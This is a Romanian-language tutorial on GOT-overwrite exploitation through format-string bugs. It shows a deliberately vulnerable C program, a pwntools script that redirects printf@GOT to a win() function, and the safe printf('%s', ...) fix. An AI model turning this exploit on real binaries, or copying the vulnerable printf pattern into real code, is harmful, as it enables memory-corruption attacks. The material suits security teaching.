<h1>GOT Overwrite – explicație pe scurt</h1>

Un <b>GOT overwrite</b> este o tehnică de exploatare folosită în vulnerabilități de tip <b>binary exploitation</b>, în special atunci când există un bug de tip <b>format string</b> sau <b>write-what-where</b>.

<h1>Ce este GOT (Global Offset Table)</h1>

<b>GOT</b> este o zonă de memorie folosită de programele ELF pentru a stoca adresele reale ale funcțiilor din biblioteci dinamice (ex: <code>puts</code>, <code>printf</code>, <code>exit</code>).  
La rulare, loader-ul rezolvă aceste adrese și le salvează în GOT.

<h1>Ce înseamnă GOT overwrite</h1>

Un <b>GOT overwrite</b> înseamnă că atacatorul suprascrie o intrare din GOT cu o adresă controlată de el.  
Astfel, când programul apelează o funcție legitimă, execuția este redirecționată către codul dorit de atacator.

<h1>Exemplu simplu</h1>

Dacă suprascriem:
<ul>
<li><code>puts@GOT</code> → adresa funcției <code>win()</code></li>
</ul>

atunci, la următorul apel <code>puts()</code>, programul va executa <code>win()</code> în loc.

<h1>De ce funcționează</h1>

<ul>
<li>GOT este scriibil dacă <b>RELRO</b> nu este Full</li>
<li>Funcțiile din libc sunt apelate indirect prin GOT</li>
<li>Un bug de scriere permite modificarea adreselor</li>
</ul>

<h1>Când se folosește</h1>

<ul>
<li>Format string vulnerability</li>
<li>Heap / stack arbitrary write</li>
<li>Binary fără Full RELRO</li>
</ul>

<h1>Scopul final</h1>

Scopul unui GOT overwrite este:
<ul>
<li>execuție de cod arbitrar</li>
<li>apelarea unei funcții privilegiate (<code>win</code>, <code>system</code>)</li>
<li>obținerea unui shell</li>
</ul>

<h1>GOT Overwrite cu Format String (FS)</h1>

Un <b>GOT overwrite</b> cu <b>format string</b> înseamnă că folosim o vulnerabilitate de tip <code>printf(user_input)</code> ca să scriem peste o intrare din <b>GOT</b> (Global Offset Table). După asta, când programul apelează funcția normală (ex: <code>printf</code>), execuția sare în funcția noastră (ex: <code>win()</code>).

<h1>De ce e vulnerabil (exemplu de cod C)</h1>

Mai jos e un exemplu clasic de vulnerabilitate. Problema este că input-ul utilizatorului este folosit ca <b>format string</b>, nu ca text simplu.

```c
#include <stdio.h>

void win() {
    puts("WIN!");
    // system("/bin/sh"); // uneori aici e shell
}

int main() {
    char buf[256];

    fgets(buf, sizeof(buf), stdin);

    // VULNERABIL: buf este folosit ca FORMAT, nu ca argument "%s"
    printf(buf);

    // Un alt apel la printf, bun ca “trigger” după GOT overwrite
    printf("\nDone!\n");
    return 0;
}

```
<b>De ce e vulnerabil:</b>

<ul> <li>Dacă utilizatorul trimite <code>%p %p %p</code>, poate citi valori din stack (leak).</li> <li>Dacă utilizatorul trimite <code>%n</code> / <code>%hn</code>, poate <b>scrie</b> în memorie (când îi “dai” adresa potrivită pe stack).</li> <li>Combinând asta, poți suprascrie <code>printf@GOT</code> cu adresa lui <code>win()</code>.</li> </ul> <h1>Exemplu: GOT Overwrite pe printf@GOT → win()</h1>


``` 

from pwn import *

elf = ELF("./binar")
context.binary = elf

win_addr   = 0x401540
printf_got = elf.got["printf"]

offset = 62  # schimbă în funcție de unde ajung adresele tale pe stack

p = process(elf.path)

payload = fmtstr_payload(
    offset,
    { printf_got: win_addr },   # scrie win_addr în printf@GOT
    write_size='short',         # scrieri pe 16 biți (%hn)
    numbwritten=420             # câte caractere au fost “deja tipărite” înainte
)

p.sendline(payload)
p.interactive()

```

<h1>Ce înseamnă offset / numbwritten</h1> <ul> <li><b>offset</b>: indexul la care “vede” <code>printf</code> adresele controlate de tine (ex: <code>%62$p</code>). E specific fiecărui binar și input-flow.</li> <li><b>numbwritten</b>: numărul de bytes considerați deja “printați” înainte ca format string-ul tău să înceapă să numere. E util când programul mai printează ceva înainte sau când payload-ul tău are prefix.</li> <li><b>write_size='short'</b>: scrie în bucăți de 2 bytes (16-bit). E mai stabil de multe ori decât write-uri mari dintr-un singur foc.</li> </ul> <h1>Exemplu de funcție vulnerabilă vs. variantă corectă</h1> <h1>Vulnerabil</h1>

```
printf(user_input);          // BAD
fprintf(stdout, user_input); // BAD
syslog(LOG_INFO, user_input);// BAD
```
<h1>Corect</h1>

```
printf("%s", user_input);          // GOOD
fprintf(stdout, "%s", user_input); // GOOD
syslog(LOG_INFO, "%s", user_input);// GOOD
```

<b>Diferența:</b> în varianta corectă, input-ul utilizatorului este tratat ca text, nu ca “instrucțiuni” de format (<code>%x</code>, <code>%n</code>, etc.).
